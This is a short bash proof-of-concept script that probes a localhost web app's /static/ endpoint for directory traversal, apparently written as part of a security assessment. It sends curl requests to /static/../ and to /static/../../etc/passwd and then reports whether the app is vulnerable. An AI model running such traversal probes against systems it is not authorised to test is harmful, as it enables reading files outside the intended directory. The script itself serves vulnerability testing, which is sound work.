#!/bin/bash

# POC: Directory Traversal via Path Manipulation in /static/ Endpoint
# This script demonstrates path traversal from /static/ to parent directories

TARGET="http://localhost:3000"
BOLD="\033[1m"
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
RESET="\033[0m"

echo -e "${BOLD}=== Directory Traversal in /static/ Endpoint ===${RESET}\n"

# Test 1: Normal static directory access (should be 403 or 200 for index)
echo -e "${BOLD}[Test 1]${RESET} Accessing /static/ directly:"
echo "Command: curl -s -o /dev/null -w '%{http_code}' $TARGET/static/"
RESPONSE1=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/static/")
echo -e "Response Code: ${YELLOW}$RESPONSE1${RESET}\n"

# Test 2: Path traversal to parent directory
echo -e "${BOLD}[Test 2]${RESET} Path traversal to parent directory:"
echo "Command: curl -i -s $TARGET/static/../"
RESPONSE2=$(curl -i -s "$TARGET/static/../")
HTTP_CODE2=$(echo "$RESPONSE2" | grep -i "^HTTP" | awk '{print $2}')
echo -e "Response Code: ${YELLOW}$HTTP_CODE2${RESET}"

# Check if we got successful traversal (200 OK)
if [ "$HTTP_CODE2" = "200" ]; then
    echo -e "${RED}[VULNERABLE]${RESET} Successfully traversed to parent directory!"
    echo -e "\nResponse Headers:"
    echo "$RESPONSE2" | sed -n '1,/^\r$/p' | head -10
    
    # Check if response contains typical index page content
    BODY=$(echo "$RESPONSE2" | sed -n '/^\r$/,$p')
    if echo "$BODY" | grep -qi "blog\|html\|<!DOCTYPE"; then
        echo -e "\n${RED}[CONFIRMED]${RESET} Response contains HTML content from parent directory (application root)"
        echo "First 200 characters of body:"
        echo "$BODY" | head -c 200
        echo -e "\n..."
    fi
else
    echo -e "${GREEN}[NOT VULNERABLE]${RESET} Path traversal blocked (HTTP $HTTP_CODE2)"
fi

# Test 3: Attempt file system traversal (should be blocked)
echo -e "\n${BOLD}[Test 3]${RESET} Attempting file system traversal to /etc/passwd:"
echo "Command: curl -s -o /dev/null -w '%{http_code}' $TARGET/static/../../etc/passwd"
RESPONSE3=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/static/../../etc/passwd")
echo -e "Response Code: ${YELLOW}$RESPONSE3${RESET}"

if [ "$RESPONSE3" = "200" ]; then
    echo -e "${RED}[CRITICAL]${RESET} File system access allowed!"
else
    echo -e "${GREEN}[GOOD]${RESET} File system access blocked (expected behavior)"
fi

# Summary
echo -e "\n${BOLD}=== Summary ===${RESET}"
if [ "$HTTP_CODE2" = "200" ]; then
    echo -e "${RED}✗ Vulnerability Confirmed:${RESET} Directory traversal from /static/ to parent directory is possible"
    echo "  Impact: Can access application files outside intended static directory"
    exit 0
else
    echo -e "${GREEN}✓ No Vulnerability Detected${RESET}"
    exit 1
fi